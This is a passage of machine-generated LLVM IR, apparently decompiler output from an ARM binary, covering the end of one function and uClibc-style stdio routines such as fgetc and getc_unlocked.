  store i32 %v2_2d0dc, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  %v2_2d0e4 = ptrtoint i8* %stack_var_-46 to i32
  store i32 %v2_2d0e4, i32* %r3.global-to-local, align 4
  %v2_2d0e8 = icmp eq i32 %v2_2d0dc, 0
  store i1 %v2_2d0e8, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-180, align 4
  %tmp255 = icmp slt i32 %v2_2d0dc, 1
  br i1 %tmp255, label %dec_label_pc_2d150, label %dec_label_pc_2d0fc

dec_label_pc_2d0fc:                               ; preds = %bb254
  %v3_2d0fc = load i32, i32* %stack_var_0, align 4
  store i32 %v3_2d0fc, i32* %lr.global-to-local, align 4
  %v1_2d100 = add i32 %v3_2d0fc, 12
  %v2_2d100 = inttoptr i32 %v1_2d100 to i32*
  %v3_2d100 = load i32, i32* %v2_2d100, align 4
  store i32 %v3_2d100, i32* %r3.global-to-local, align 4
  %v1_2d104 = and i32 %v3_2d100, 8
  %v2_2d104 = icmp eq i32 %v1_2d104, 0
  store i1 %v2_2d104, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2d104, label %dec_label_pc_2d128, label %dec_label_pc_2d10c

dec_label_pc_2d10c:                               ; preds = %dec_label_pc_2d0fc
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -34541), i32* %r3.global-to-local, align 4
  %v1_2d11c = add i32 %v1_2d0c0.pre, 12
  store i32 %v1_2d11c, i32* %r6.global-to-local, align 4
  %v1_2d120 = inttoptr i32 %v1_2d0c0.pre to i32*
  store i32 160, i32* %v1_2d120, align 4
  %v3_2d120 = add i32 %v1_2d0c0.pre, 4
  %v4_2d120 = inttoptr i32 %v3_2d120 to i32*
  %v5_2d120 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_2d120, i32* %v4_2d120, align 4
  %v6_2d120 = add i32 %v1_2d0c0.pre, 8
  %v7_2d120 = inttoptr i32 %v6_2d120 to i32*
  %v8_2d120 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_2d120, i32* %v7_2d120, align 4
  br label %dec_label_pc_2d154

dec_label_pc_2d128:                               ; preds = %dec_label_pc_2d0fc
  store i32 %v3_2d0fc, i32* %ip.global-to-local, align 4
  %v1_2d12c = add i32 %v3_2d0fc, 16
  %v2_2d12c = inttoptr i32 %v1_2d12c to i32*
  %v3_2d12c = load i32, i32* %v2_2d12c, align 4
  store i32 %v3_2d12c, i32* %r3.global-to-local, align 4
  %v7_2d130 = icmp eq i32 %v3_2d12c, 48
  store i1 %v7_2d130, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2d130, label %.thread54.thread70, label %bb256

bb256:                                            ; preds = %dec_label_pc_2d128
  store i32 %v2_2d0c4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2d150

.thread54.thread70:                               ; preds = %dec_label_pc_2d128
  %v4_2d13c = load i32, i32* %stack_var_-164, align 4
  store i32 %v1_2d0c0.pre, i32* %r6.global-to-local, align 4
  %v3_2d144 = add i32 %v4_2d13c, %v2_2d0dc
  store i32 %v3_2d144, i32* %r3.global-to-local, align 4
  store i32 %v3_2d144, i32* %stack_var_-164, align 4
  br label %dec_label_pc_2d154

dec_label_pc_2d150:                               ; preds = %bb256, %bb254
  store i32 %v1_2d0c0.pre, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_2d154

dec_label_pc_2d154:                               ; preds = %.thread54.thread70, %dec_label_pc_2d10c, %dec_label_pc_2d150
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_2d158 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_2d158, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_2d15c

dec_label_pc_2d15c:                               ; preds = %dec_label_pc_2d184, %dec_label_pc_2d154
  %v0_2d15c = phi i32 [ %v1_2d178, %dec_label_pc_2d184 ], [ %v2_2d158, %dec_label_pc_2d154 ]
  %v1_2d15c = inttoptr i32 %v0_2d15c to i32*
  %v2_2d15c = load i32, i32* %v1_2d15c, align 4
  store i32 %v2_2d15c, i32* %r1.global-to-local, align 4
  %v3_2d15c = add i32 %v0_2d15c, 4
  %v4_2d15c = inttoptr i32 %v3_2d15c to i32*
  %v5_2d15c = load i32, i32* %v4_2d15c, align 4
  store i32 %v5_2d15c, i32* %r2.global-to-local, align 4
  %v6_2d15c = add i32 %v0_2d15c, 8
  %v7_2d15c = inttoptr i32 %v6_2d15c to i32*
  %v8_2d15c = load i32, i32* %v7_2d15c, align 4
  store i32 %v8_2d15c, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg5, i32* @ip, align 4
  store i32 184688, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg5)
  %v0_2d170 = load i32, i32* %r5.global-to-local, align 4
  %v1_2d170 = add i32 %v0_2d170, 4
  %v2_2d170 = inttoptr i32 %v1_2d170 to i32*
  %v3_2d170 = load i32, i32* %v2_2d170, align 4
  store i32 %v3_2d170, i32* %r3.global-to-local, align 4
  %v0_2d174 = load i32, i32* %r0.global-to-local, align 4
  %v9_2d174 = icmp eq i32 %v0_2d174, %v3_2d170
  store i1 %v9_2d174, i1* %cpsr_z.global-to-local, align 1
  %v1_2d178 = add i32 %v0_2d170, 12
  store i32 %v1_2d178, i32* %r5.global-to-local, align 4
  br i1 %v9_2d174, label %dec_label_pc_2d184, label %bb257

bb257:                                            ; preds = %dec_label_pc_2d15c
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_2d1a4

dec_label_pc_2d184:                               ; preds = %dec_label_pc_2d15c
  %v0_2d188.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_2d184 = load i32, i32* %r6.global-to-local, align 4
  %v3_2d184 = icmp ult i32 %v1_2d178, %v1_2d184
  %v9_2d184 = icmp eq i32 %v1_2d178, %v1_2d184
  store i1 %v9_2d184, i1* %cpsr_z.global-to-local, align 1
  %v2_2d188 = add i32 %v0_2d188.pre, %v3_2d170
  store i32 %v2_2d188, i32* %r7.global-to-local, align 4
  br i1 %v3_2d184, label %dec_label_pc_2d15c, label %dec_label_pc_2d1a4

dec_label_pc_2d19c:                               ; preds = %.thread21, %bb239
  %v0_2d19c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_2d19c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_2ce9c

dec_label_pc_2d1a4:                               ; preds = %dec_label_pc_2d184, %bb257
  %v0_2d1a4 = phi i32 [ -1, %bb257 ], [ %v2_2d188, %dec_label_pc_2d184 ]
  store i32 %v0_2d1a4, i32* %r0.global-to-local, align 4
  store i32 %v27_2c9e0, i32* @lr, align 4
  ret i32 %v0_2d1a4

; uselistorder directives
  uselistorder i32 %v0_2d1a4, { 1, 0 }
  uselistorder i32 %v1_2d184, { 1, 0 }
  uselistorder i32 %v1_2d178, { 0, 1, 3, 2 }
  uselistorder i32 %v0_2d15c, { 2, 1, 0 }
  uselistorder i32 %v3_2d0fc, { 1, 0, 2, 3 }
  uselistorder i32 %v2_2d0c4, { 0, 1, 3, 2 }
  uselistorder i32 %v4_2d0b8, { 1, 2, 0 }
  uselistorder i32 %v0_2d0b8, { 1, 0 }
  uselistorder i32 %v1_2d0c0.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_2d078, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v6_2d074, { 2, 1, 0 }
  uselistorder i32 %storemerge158, { 1, 0 }
  uselistorder i32 %v0_2d038, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_2d000, { 1, 0 }
  uselistorder i32 %v1_2d000, { 1, 2, 0, 3 }
  uselistorder i32 %v2_2cffc, { 2, 4, 0, 1, 3, 5 }
  uselistorder i1 %v2_2cf5c, { 2, 1, 0 }
  uselistorder i32 %v2_2cedc, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v2_2cecc, { 1, 2, 3, 5, 0, 4, 6 }
  uselistorder i1 %v2_2ceb8, { 1, 0, 2 }
  uselistorder i32 %v5_2ceb4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_2cf4430, { 3, 0, 4, 6, 1, 2, 5, 7, 8, 9 }
  uselistorder i1 %v2_2ce6c, { 1, 0 }
  uselistorder i32 %v1_2ce64, { 1, 2, 0 }
  uselistorder i32 %v2_2ce58, { 1, 0 }
  uselistorder i32 %v1_2ce58, { 1, 2, 0, 3 }
  uselistorder i32 %v0_2ce58, { 3, 4, 0, 5, 6, 1, 2, 7 }
  uselistorder i1 %v3_2ce28, { 1, 0 }
  uselistorder i32 %v0_2ce28, { 0, 2, 1 }
  uselistorder i32 %v2_2ce24, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v1_2ce10, { 1, 0 }
  uselistorder i1 %v2_2ce00, { 1, 0 }
  uselistorder i32 %v1_2cdfc, { 3, 2, 1, 0 }
  uselistorder i32 %v2_2cdf8, { 1, 0 }
  uselistorder i1 %v2_2cde8, { 1, 0 }
  uselistorder i32 %v1_2cddc, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_2cd90, { 1, 2, 0, 3 }
  uselistorder i32 %v0_2cd90, { 1, 0, 2 }
  uselistorder i1 %v2_2cd78, { 1, 0 }
  uselistorder i32 %v5_2cd60, { 1, 0 }
  uselistorder i32 %v0_2cd4c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_2cd34, { 1, 2, 0 }
  uselistorder i32 %v2_2cd30, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_2ccc8, { 2, 4, 1, 0, 3 }
  uselistorder i32 %stack_var_-192.4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_2cc70, { 1, 0 }
  uselistorder double %v2_2cc34, { 1, 0 }
  uselistorder i32 %v0_2cbf0, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 %v3_2cbe4, { 1, 0 }
  uselistorder i32 %v2_2cc20, { 1, 3, 0, 2 }
  uselistorder i32 %v0_2cbb4, { 1, 0 }
  uselistorder i32 %v5_2cb70, { 1, 0 }
  uselistorder i32 %v1_2ca90.v0_2ca7c5, { 1, 0 }
  uselistorder i32 %v3_2cb4c, { 1, 0 }
  uselistorder i32 %v0_2cb28, { 0, 2, 3, 1 }
  uselistorder i32 %v2_2cb10, { 2, 1, 0 }
  uselistorder i32 %v0_2caf4, { 1, 0 }
  uselistorder i32 %v0_2ca14, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %stack_var_-156, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-82, { 1, 2, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-47, { 1, 0 }
  uselistorder i32* %stack_var_-164, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-46, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32* %stack_var_0, { 2, 3, 0, 1 }
  uselistorder i32 %tmp160, { 1, 0, 2, 3 }
  uselistorder i32* %sb.global-to-local, { 2, 3, 4, 5, 6, 0, 7, 8, 1, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 12, 11, 13 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 13, 14, 15, 5, 16, 17, 6, 18, 19, 20, 7, 21, 22, 8, 23, 24, 9, 10, 11, 12, 25, 26, 27, 28, 30, 29, 31, 32 }
  uselistorder i32* %r6.global-to-local, { 3, 2, 1, 4, 5, 6, 7, 8, 0, 9, 10, 14, 15, 16, 11, 17, 18, 12, 19, 13, 20, 21, 22 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 9, 7, 10, 11, 8, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 20, 18, 19, 21, 22, 23, 24, 25, 26, 27, 29, 43, 30, 34, 31, 32, 33, 35, 28, 36, 37, 38, 39, 40, 41, 42, 64, 45, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 2, 65, 66, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 18, 15, 19, 20, 16, 17, 21, 22, 23, 26, 24, 25, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 11, 12, 15, 17, 13, 18, 16, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35 }
  uselistorder i32* %r0.global-to-local, { 6, 7, 8, 9, 2, 10, 11, 18, 17, 16, 19, 12, 13, 20, 14, 15, 5, 21, 4, 22, 23, 0, 1, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 36, 3 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 5, 6, 7, 2, 3, 4, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 2, 21, 22, 23, 24, 25, 26, 27, 28, 1, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 0, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61 }
  uselistorder i32 160, { 0, 1, 9, 2, 10, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 112, { 3, 6, 0, 7, 4, 1, 8, 5, 2 }
  uselistorder i32 176, { 1, 3, 2, 4, 0, 5, 6 }
  uselistorder i8 48, { 4, 6, 0, 7, 1, 8, 9, 10, 11, 2, 3, 12, 5 }
  uselistorder i32 (i32, i32, i32, i32)* @__aeabi_dcmpge, { 1, 0 }
  uselistorder i32 1104006501, { 4, 1, 2, 0, 3 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -34520), { 0, 2, 1 }
  uselistorder i32 1100470148, { 1, 2, 0, 3 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -34544), { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__aeabi_dcmplt, { 3, 2, 1, 0 }
  uselistorder double 0.000000e+00, { 2, 1, 0, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__aeabi_dcmpeq, { 2, 1, 0 }
  uselistorder i8 32, { 5, 6, 7, 8, 9, 12, 11, 13, 10, 16, 15, 14, 17, 18, 19, 2, 1, 0, 3, 4, 20 }
  uselistorder i32 97, { 1, 0, 9, 5, 6, 8, 2, 3, 4, 7 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 0, 1, 2, 6, 5, 4, 3, 8, 7, 9 }
  uselistorder label %dec_label_pc_2d19c, { 1, 0 }
  uselistorder label %dec_label_pc_2d154, { 2, 0, 1 }
  uselistorder label %bb254, { 1, 0 }
  uselistorder label %dec_label_pc_2d0b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2d02c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2cffc, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %dec_label_pc_2cfd4, { 1, 0 }
  uselistorder label %dec_label_pc_2cfa8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2cf84, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2cf54, { 2, 1, 0 }
  uselistorder label %.thread34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2ce9c, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_2ce8c, { 1, 0 }
  uselistorder label %bb236, { 1, 0 }
  uselistorder label %bb234, { 1, 0 }
  uselistorder label %bb232, { 1, 0 }
  uselistorder label %.thread145, { 1, 0 }
  uselistorder label %._crit_edge93, { 1, 0 }
  uselistorder label %bb228, { 1, 0 }
  uselistorder label %bb226, { 1, 0 }
  uselistorder label %.preheader, { 3, 1, 0, 2 }
  uselistorder label %bb223, { 1, 0 }
  uselistorder label %dec_label_pc_2cdb4, { 2, 1, 0 }
  uselistorder label %bb220, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2ccc0, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_2cc70, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2cc68, { 1, 0 }
  uselistorder label %bb212, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %dec_label_pc_2cb4c, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_2ca68, { 1, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %bb203, { 1, 0 }
  uselistorder label %bb201, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_2d1d4 = load i32, i32* @r4, align 4
  store i32 %v3_2d1d4, i32* %stack_var_-16, align 4
  %v6_2d1d4 = load i32, i32* @r5, align 4
  %v12_2d1d4 = load i32, i32* @lr, align 4
  %v1_2d1d8 = add i32 %arg1, 52
  %v2_2d1d8 = inttoptr i32 %v1_2d1d8 to i32*
  %v3_2d1d8 = load i32, i32* %v2_2d1d8, align 4
  %v2_2d1e0 = icmp eq i32 %v3_2d1d8, 0
  store i32 %arg1, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r6.global-to-local, align 4
  br i1 %v2_2d1e0, label %dec_label_pc_2d218, label %dec_label_pc_2d1f4

dec_label_pc_2d1f4:                               ; preds = %entry
  %v1_2d1f4 = add i32 %arg1, 16
  %v2_2d1f4 = inttoptr i32 %v1_2d1f4 to i32*
  %v3_2d1f4 = load i32, i32* %v2_2d1f4, align 4
  %v1_2d1f8 = add i32 %arg1, 24
  %v2_2d1f8 = inttoptr i32 %v1_2d1f8 to i32*
  %v3_2d1f8 = load i32, i32* %v2_2d1f8, align 4
  %v3_2d1fc = icmp ult i32 %v3_2d1f4, %v3_2d1f8
  br i1 %v3_2d1fc, label %.thread, label %dec_label_pc_2d20c

.thread:                                          ; preds = %dec_label_pc_2d1f4
  %v2_2d200 = inttoptr i32 %v3_2d1f4 to i8*
  %v3_2d200 = load i8, i8* %v2_2d200, align 1
  %v4_2d200 = zext i8 %v3_2d200 to i32
  store i32 %v4_2d200, i32* %r4.global-to-local, align 4
  %v6_2d200 = add i32 %v3_2d1f4, 1
  store i32 %v6_2d200, i32* %v2_2d1f4, align 4
  br label %dec_label_pc_2d28c

dec_label_pc_2d20c:                               ; preds = %dec_label_pc_2d1f4
  %v1_2d20c = inttoptr i32 %arg1 to i16*
  %v2_2d20c = call i32 @getc_unlocked(i16* %v1_2d20c)
  store i32 %v2_2d20c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_2d28c

dec_label_pc_2d218:                               ; preds = %entry
  %v1_2d21c = add i32 %arg1, 56
  store i32 %v1_2d21c, i32* @r4, align 4
  %v4_2d230 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 164) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_2d230)
  %v0_2d244 = load i32, i32* %r6.global-to-local, align 4
  %v2_2d244 = add i32 %v0_2d244, 36
  %v3_2d244 = inttoptr i32 %v2_2d244 to i32*
  %v4_2d244 = load i32, i32* %v3_2d244, align 4
  store i32 184912, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_2d244)
  %v0_2d250 = load i32, i32* @r5, align 4
  %v1_2d250 = add i32 %v0_2d250, 16
  %v2_2d250 = inttoptr i32 %v1_2d250 to i32*
  %v3_2d250 = load i32, i32* %v2_2d250, align 4
  %v1_2d254 = add i32 %v0_2d250, 24
  %v2_2d254 = inttoptr i32 %v1_2d254 to i32*
  %v3_2d254 = load i32, i32* %v2_2d254, align 4
  %v3_2d258 = icmp ult i32 %v3_2d250, %v3_2d254
  br i1 %v3_2d258, label %.thread2, label %dec_label_pc_2d268

.thread2:                                         ; preds = %dec_label_pc_2d218
  %v2_2d25c = inttoptr i32 %v3_2d250 to i8*
  %v3_2d25c = load i8, i8* %v2_2d25c, align 1
  %v4_2d25c = zext i8 %v3_2d25c to i32
  store i32 %v4_2d25c, i32* %r4.global-to-local, align 4
  %v6_2d25c = add i32 %v3_2d250, 1
  store i32 %v6_2d25c, i32* %v2_2d250, align 4
  br label %dec_label_pc_2d274

dec_label_pc_2d268:                               ; preds = %dec_label_pc_2d218
  %v1_2d26c = inttoptr i32 %v0_2d250 to i16*
  %v2_2d26c = call i32 @getc_unlocked(i16* %v1_2d26c)
  store i32 %v2_2d26c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_2d274

dec_label_pc_2d274:                               ; preds = %.thread2, %dec_label_pc_2d268
  %v0_2d280 = load i32, i32* %r6.global-to-local, align 4
  %v2_2d280 = add i32 %v0_2d280, 76
  %v3_2d280 = inttoptr i32 %v2_2d280 to i32*
  %v4_2d280 = load i32, i32* %v3_2d280, align 4
  store i32 %v4_2d280, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_2d280)
  br label %dec_label_pc_2d28c

dec_label_pc_2d28c:                               ; preds = %.thread, %dec_label_pc_2d20c, %dec_label_pc_2d274
  %v0_2d28c = load i32, i32* %r4.global-to-local, align 4
  %v2_2d294 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_2d294, i32* @r4, align 4
  store i32 %v6_2d1d4, i32* @r5, align 4
  store i32 %v12_2d1d4, i32* @lr, align 4
  ret i32 %v0_2d28c

; uselistorder directives
  uselistorder i32 %v3_2d250, { 1, 0, 2 }
  uselistorder i32 %v3_2d1f4, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 (i16*)* @getc_unlocked, { 0, 1, 3, 2 }
  uselistorder i32 %arg1, { 0, 2, 4, 3, 1, 5 }
  uselistorder label %dec_label_pc_2d28c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2d274, { 1, 0 }
}

define i32 @function_2d2a0(i32 %arg1) local_unnamed_addr {
dec_label_pc_2d2a0:
  %v0_2d2a0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_2d2a0, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_2d2a0
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_2d2a0, %bb
  %v4_2d2ac = phi i32 [ %arg1, %dec_label_pc_2d2a0 ], [ 0, %bb ]
  ret i32 %v4_2d2ac

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_2d2b0 = load i32, i32* @r4, align 4
  store i32 %v3_2d2b0, i32* %stack_var_-12, align 4
  %v6_2d2b0 = load i32, i32* @r5, align 4
  %v9_2d2b0 = load i32, i32* @lr, align 4
  %v0_2d2b4 = load i32, i32* @r0, align 4
  %v1_2d2b4 = add i32 %v0_2d2b4, 16
  %v2_2d2b4 = inttoptr i32 %v1_2d2b4 to i32*
  %v3_2d2b4 = load i32, i32* %v2_2d2b4, align 4
  store i32 %v3_2d2b4, i32* %r2.global-to-local, align 4
  %v1_2d2b8 = add i32 %v0_2d2b4, 24
  %v2_2d2b8 = inttoptr i32 %v1_2d2b8 to i32*
  %v3_2d2b8 = load i32, i32* %v2_2d2b8, align 4
  %v3_2d2bc = icmp ult i32 %v3_2d2b4, %v3_2d2b8
  store i32 %v0_2d2b4, i32* @r4, align 4
  br i1 %v3_2d2bc, label %bb, label %dec_label_pc_2d2dc

bb:                                               ; preds = %entry
  %v2_2d2c8 = inttoptr i32 %v3_2d2b4 to i8*
  %v3_2d2c8 = load i8, i8* %v2_2d2c8, align 1
  %v4_2d2c8 = zext i8 %v3_2d2c8 to i32
  store i32 %v4_2d2c8, i32* %r0.global-to-local, align 4
  %v6_2d2c8 = add i32 %v3_2d2b4, 1
  store i32 %v6_2d2c8, i32* %r2.global-to-local, align 4
  store i32 %v6_2d2c8, i32* %v2_2d2b4, align 4
  br label %dec_label_pc_2d3c8

dec_label_pc_2d2dc:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r5, align 4
  %v1_2d2dc = inttoptr i32 %v0_2d2b4 to i16*
  %v2_2d2dc = load i16, i16* %v1_2d2dc, align 2
  %v3_2d2dc = zext i16 %v2_2d2dc to i32
  %v1_2d2e0 = and i32 %v3_2d2dc, 131
  %tmp25 = icmp ugt i32 %v1_2d2e0, 128
  br i1 %tmp25, label %dec_label_pc_2d2fc, label %dec_label_pc_2d2ec

dec_label_pc_2d2ec:                               ; preds = %dec_label_pc_2d2dc
  store i32 128, i32* @r1, align 4
  %v0_2d2f0 = call i32 @__stdio_trans2r_o()
  store i32 %v0_2d2f0, i32* %r0.global-to-local, align 4
  %v2_2d2f4 = icmp eq i32 %v0_2d2f0, 0
  br i1 %v2_2d2f4, label %dec_label_pc_2d2ec.dec_label_pc_2d2fc_crit_edge, label %dec_label_pc_2d3c4

dec_label_pc_2d2ec.dec_label_pc_2d2fc_crit_edge:  ; preds = %dec_label_pc_2d2ec
  %v0_2d2fc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_2d2fc

dec_label_pc_2d2fc:                               ; preds = %dec_label_pc_2d2ec.dec_label_pc_2d2fc_crit_edge, %dec_label_pc_2d2dc
  %v2_2d33c = phi i32 [ %v0_2d2fc.pre, %dec_label_pc_2d2ec.dec_label_pc_2d2fc_crit_edge ], [ %v0_2d2b4, %dec_label_pc_2d2dc ]
  %v1_2d2fc = inttoptr i32 %v2_2d33c to i16*
  %v2_2d2fc = load i16, i16* %v1_2d2fc, align 2
  %v3_2d2fc = zext i16 %v2_2d2fc to i32
  store i32 %v3_2d2fc, i32* %r2.global-to-local, align 4
  %v1_2d300 = and i32 %v3_2d2fc, 2
  %v2_2d300 = icmp eq i32 %v1_2d300, 0
  br i1 %v2_2d300, label %dec_label_pc_2d32c, label %dec_label_pc_2d308

dec_label_pc_2d308:                               ; preds = %dec_label_pc_2d2fc
  %tmp26 = urem i16 %v2_2d2fc, 2
  %v1_2d308 = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_2d308
  %v4_2d30c = and i32 %tmp22, 4
  %v5_2d30c = add i32 %v4_2d30c, %v2_2d33c
  %v1_2d310 = add i32 %v5_2d30c, 36
  %v2_2d310 = inttoptr i32 %v1_2d310 to i8*
  %v3_2d310 = load i8, i8* %v2_2d310, align 1
  %v4_2d310 = zext i8 %v3_2d310 to i32
  %v1_2d314 = add nsw i32 %v3_2d2fc, -1
  store i32 %v1_2d314, i32* %r2.global-to-local, align 4
  store i32 %v4_2d310, i32* %r0.global-to-local, align 4
  %v2_2d320 = add i32 %v2_2d33c, 40
  %v3_2d320 = inttoptr i32 %v2_2d320 to i32*
  store i32 0, i32* %v3_2d320, align 4
  %v0_2d324 = load i32, i32* %r2.global-to-local, align 4
  %v1_2d324 = trunc i32 %v0_2d324 to i16
  %v2_2d324 = load i32, i32* @r4, align 4
  %v3_2d324 = inttoptr i32 %v2_2d324 to i16*
  store i16 %v1_2d324, i16* %v3_2d324, align 2
  br label %dec_label_pc_2d3c8

dec_label_pc_2d32c:                               ; preds = %dec_label_pc_2d2fc
  %v1_2d32c = add i32 %v2_2d33c, 16
  %v1_2d330 = inttoptr i32 %v1_2d32c to i32*
  %v2_2d330 = load i32, i32* %v1_2d330, align 4
  %v3_2d330 = add i32 %v2_2d33c, 20
  %v4_2d330 = inttoptr i32 %v3_2d330 to i32*
  %v5_2d330 = load i32, i32* %v4_2d330, align 4
  %v9_2d334 = icmp eq i32 %v5_2d330, %v2_2d330
  br i1 %v9_2d334, label %dec_label_pc_2d344, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_2d32c
  %v2_2d338 = inttoptr i32 %v2_2d330 to i8*
  %v3_2d338 = load i8, i8* %v2_2d338, align 1
  %v4_2d338 = zext i8 %v3_2d338 to i32
  store i32 %v4_2d338, i32* %r0.global-to-local, align 4
  %v6_2d338 = add i32 %v2_2d330, 1
  store i32 %v6_2d338, i32* %v1_2d330, align 4
  br label %dec_label_pc_2d3c8

dec_label_pc_2d344:                               ; preds = %dec_label_pc_2d32c
  %v1_2d344 = add i32 %v2_2d33c, 4
  %v2_2d344 = inttoptr i32 %v1_2d344 to i32*
  %v3_2d344 = load i32, i32* %v2_2d344, align 4
  %v7_2d348 = icmp eq i32 %v3_2d344, -2
  br i1 %v7_2d348, label %.thread7, label %dec_label_pc_2d35c

.thread7:                                         ; preds = %dec_label_pc_2d344
  %v2_2d34c = or i16 %v2_2d2fc, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_2d34c, i16* %v1_2d2fc, align 2
  br label %dec_label_pc_2d3c8

dec_label_pc_2d35c:                               ; preds = %dec_label_pc_2d344
  %v1_2d35c = and i32 %v3_2d2fc, 768
